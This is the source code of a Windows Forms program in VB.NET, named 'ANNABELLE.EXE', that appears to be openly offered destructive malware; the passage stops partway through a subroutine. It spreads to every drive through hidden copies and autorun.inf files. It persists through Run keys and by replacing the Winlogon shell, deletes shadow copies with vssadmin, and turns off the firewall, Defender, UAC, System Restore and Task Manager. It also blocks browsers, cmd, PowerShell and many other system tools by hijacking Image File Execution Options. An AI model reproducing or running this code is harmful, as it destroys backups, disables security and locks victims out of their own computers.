Imports System.IO
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System
Imports System.Text
Imports System.Runtime.InteropServices



Public Class Form1

    Public Shared ReadOnly HWND_BROADCAST As New IntPtr(&HFFFF)
    Public Const WM_SETTINGCHANGE As Integer = &H1A 'it should be &H001A

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property
    Public Shared Sub Save(ByVal filepath As String, ByVal file As Object)
        Dim fbyte() As Byte = file
        My.Computer.FileSystem.WriteAllBytes(filepath, fbyte, True)
    End Sub

    Dim filenamez As String

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Public Sub Infect()
        Dim usbs As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        Dim driver() As String = (IO.Directory.GetLogicalDrives)
        For Each usbs In driver
            Try
                IO.File.Copy(Application.ExecutablePath, usbs & "Copter.flv.exe")
                Dim AutoStart = New StreamWriter(usbs & "\autorun.inf")
                AutoStart.WriteLine("[autorun]")
                AutoStart.WriteLine("open=" & usbs & "Copter.flv.exe")
                AutoStart.WriteLine("shellexecute=" & usbs, 1)
                AutoStart.Close()
                System.IO.File.SetAttributes(usbs & "autorun.inf", FileAttributes.Hidden)
                System.IO.File.SetAttributes(usbs & "Copter.flv.exe", FileAttributes.Hidden)
            Catch ex As Exception

            End Try
        Next
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If File.Exists("C:\Save1.txt") Then
            Me.Close()
            Form2.Show()
        Else
            If System.Environment.Is64BitOperatingSystem = True Then
                'nothing
            Else
                MsgBox("The Program is on a 32 Bit Operating System not available, because 32 Bit is outdated.", MsgBoxStyle.Critical, "ANNABELLE.EXE")
                Me.Close()
            End If
        End If
    End Sub

    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        If File.Exists("C:\Detect.txt") Then
            Me.Close()
            Form2.Show()
        Else
            Registrys()
            If System.Environment.Is64BitOperatingSystem = True Then
                'nothing
            Else
                MsgBox("The Program is on a 32 Bit Operating System not available, because 32 Bit is outdated.", MsgBoxStyle.Critical, "ANNABELLE.EXE")
                Me.Close()
            End If
        End If
    End Sub

    Public Sub Registrys()
        My.Computer.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        My.Computer.Registry.LocalMachine.OpenSubKey("Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("vssadmin delete shadows /all /quiet", AppWinStyle.Hide)
        Shell("NetSh Advfirewall set allprofiles state off", vbHide)

        Dim RegistryKey As Object
        RegistryKey = CreateObject("WScript.Shell")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender\DisableRoutinelyTakingAction", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\WindowsDefenderMAJ", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings\Enabled", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\USBSTOR", 4, "REG_DWORD") 'Normally 4
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR", 4, "REG_DWORD") 'Normally 4

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD") 'Normally 2
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\DisableCMD", 2, "REG_DWORD") 'Normally 2

        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\Restrict_Run", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService", 4, "REG_DWORD")

        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend", 3, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot\Minimal\MinimalX", 1, "REG_DWORD")

        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", True)
        key.SetValue("Shell", Application.ExecutablePath)
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
        Me.Hide()
        Msconfig()
        Taskmgr()
        Cmd()
        Explorer()
        Chrome()
        Firefox()
        Opera()
        Microsoftedge()
        Microsoftedgecp()
        Notepad()
        Notepad1()
        Iexplore()
        MSASCuiL()
        Mmc()
        Gpedit()
        UserAccountControlSettings()
        Autoruns64()
        Autoruns()
        Taskkill()
        Powershell()
        Taskkill()
        Yandex()
        Attrib()
        Bcdedit()
        Sethc()
        Mspaint()
        Dllhost()
        Rundll()
        Rundll32()
        Cabinet()
        Chkdsk()
        DBGHELP()
        DCIMAN32()
        Wmplayer()
        Ksuser()
        Mpg4dmod()
        Mydocs()
        Rasman()
        Shellstyle()
        Secpol()
        Url()
        Usbui()
        Webcheck()
        Recoverydrive()
        Logoff()
        Control()
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Msconfig()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Explorer()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Taskmgr()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Cmd()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Chrome()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Firefox()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\firefox.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Opera()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\opera.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Microsoftedge()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedge.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedge.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Microsoftedgecp()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedgecp.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\microsoftedgecp.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Notepad()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad++.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad++.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Iexplore()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Notepad1()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub MSASCuiL()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCuiL.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MSASCuiL.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Mmc()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)

    End Sub

    Public Sub Gpedit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub UserAccountControlSettings()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UserAccountControlSettings.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\UserAccountControlSettings.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Autoruns64()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns64.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns64.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub

    Public Sub Autoruns()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Autoruns.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Taskkill()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Powershell()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Yandex()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\yandex.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\yandex.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Attrib()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Bcdedit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bcdedit.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bcdedit.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Sethc()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Mspaint()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Dllhost()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dllhost.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dllhost.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Rundll32()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll32.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll32.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Rundll()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rundll.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Cabinet()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cabinet.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cabinet.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Chkdsk()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chkdsk.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chkdsk.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub DBGHELP()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DBGHELP.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DBGHELP.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub DCIMAN32()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DCIMAN32.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DCIMAN32.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Wmplayer()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmplayer.exe", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Ksuser()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ksuser.dll", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ksuser.dll", True)
        key.SetValue("Debugger", "RIP")
        SendNotifyMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0)
    End Sub
    Public Sub Mpg4dmod()
        Dim regKey As RegistryKey
